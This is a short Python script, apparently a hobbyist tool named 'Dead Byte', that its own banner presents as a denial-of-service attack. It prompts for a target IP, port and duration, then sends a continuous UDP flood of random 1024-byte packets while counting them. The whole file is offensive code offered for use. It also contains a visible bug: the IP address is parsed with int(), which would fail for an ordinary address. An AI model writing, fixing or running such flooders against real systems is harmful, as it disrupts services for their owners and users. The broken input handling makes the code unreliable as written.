import os
import sys
import time
import socket
import random


sock = socket.socket(socket.AF_INET,  socket.SOCK_DGRAM)


bytes = random._urandom(1024)


os.system("clear")

print("""
  ___              _   ___      _                         
 |   \ ___ __ _ __| | | _ )_  _| |_ ___ 
 | |) / -_) _` / _` | | _ \ || |  _/ -_)
 |___/\___\__,_\__,_| |___/\_, |\__\___|.  V1.0
                           |__/  
                           
        |.-----.|    DENIAL OF SERVICE ATTACK
        ||x . x||             
        ||_.-._||  (not so powerful but it works)
        `--)-(--`
       __[=== o]___
      |:::::::::::|\\         created by x0han30
      `-=========-`()         
            
""")
print(" ")
print("Enter the target IP : ")
ip = int(input(">>> "))
print(" ")
print("Enter the Port : ")
port = int(input(">>> "))
print(" ")
print("Input Time : ")
dur = int(input(">>> "))
print(" ")
timeout = time.time() + dur
sent = 0

while True:
             try :
                   if time.time() > timeout :
                             break
                   else:
                             pass
                   sock.sendto(bytes,(ip,port))
                   sent = sent + 1
                   print("sent %s packets to %s through port %s"%(sent,ip,port))
             except KeyboardInterrupt :
                   sys.exit()
